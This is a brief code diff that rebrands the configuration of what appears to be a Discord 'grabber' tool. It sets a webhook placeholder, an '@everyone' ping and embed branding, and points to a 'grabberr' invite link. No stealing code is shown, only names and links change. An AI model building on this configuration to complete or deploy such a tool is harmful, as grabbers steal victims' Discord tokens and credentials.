@@ -9,7 +9,7 @@ const fs = require("fs");
 
 
 var config = {
-    brand: "Shadow X 1337",
+    brand: "1337xshadow",
 
     webhook: "%WEBHOOK_LINK%",
 
@@ -21,12 +21,12 @@ var config = {
     ping: [false, "@everyone"],
 
     embed: {
-        username: "Shadow X 1337",
+        username: "1337xshadow",
         footer: {
-            text: `Shadow X 1337`,
+            text: `1337xshadow`,
             icon_url: "https://cdn.discordapp.com/attachments/1093554703289299064/1093564123511525488/1337.jpg",
         },
-        href: "https://discord.gg/1337s",
+        href: "https://discord.gg/grabberr",
         avatar_url: "https://cdn.discordapp.com/attachments/1093554703289299064/1093564123511525488/1337.jpg"
     },
 
